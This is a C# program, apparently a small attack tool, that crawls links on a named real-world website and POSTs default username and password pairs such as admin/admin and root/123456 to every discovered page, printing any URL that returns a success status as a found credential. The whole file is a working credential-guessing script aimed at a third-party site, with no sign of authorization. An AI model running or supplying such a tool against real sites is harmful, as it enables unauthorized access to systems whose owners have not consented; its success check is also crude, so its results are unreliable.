

using System;
using System.Collections.Generic;
using System.Net.Http;
using HtmlAgilityPack;

namespace WebSpiderWithAuthCheck
{
    class Program
    {
        private static readonly string baseUrl = "https://endpts.com";
        private static readonly string[] usernames = { "admin", "root", "user" };
        private static readonly string[] passwords = { "admin", "password", "root", "123456" };

        static async System.Threading.Tasks.Task Main(string[] args)
        {
            var discoveredUrls = await DiscoverUrlsAsync(baseUrl);

            foreach (var url in discoveredUrls)
            {
                Console.WriteLine($"Checking URL: {url}");
                await TestDefaultCredentialsAsync(url);
            }
        }

        static async System.Threading.Tasks.Task<HashSet<string>> DiscoverUrlsAsync(string url)
        {
            var foundUrls = new HashSet<string>();

            using (var client = new HttpClient())
            {
                var content = await client.GetStringAsync(url);
                var doc = new HtmlDocument();
                doc.LoadHtml(content);

                var links = doc.DocumentNode.SelectNodes("//a[@href]");

                if (links != null)
                {
                    foreach (var link in links)
                    {
                        var hrefValue = link.GetAttributeValue("href", string.Empty);

                        if (!string.IsNullOrEmpty(hrefValue) && hrefValue.StartsWith("/") && !foundUrls.Contains(hrefValue))
                        {
                            var fullUrl = $"{baseUrl}{hrefValue}";
                            foundUrls.Add(fullUrl);
                        }
                    }
                }
            }

            return foundUrls;
        }

        static async System.Threading.Tasks.Task TestDefaultCredentialsAsync(string url)
        {
            using (var client = new HttpClient())
            {
                foreach (var username in usernames)
                {
                    foreach (var password in passwords)
                    {
                        var content = new FormUrlEncodedContent(new[]
                        {
                            new KeyValuePair<string, string>("username", username),
                            new KeyValuePair<string, string>("password", password)
                        });

                        var response = await client.PostAsync(url, content);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine($"Possible default credential found on {url}: {username}/{password}");
                        }
                    }
                }
            }
        }
    }
}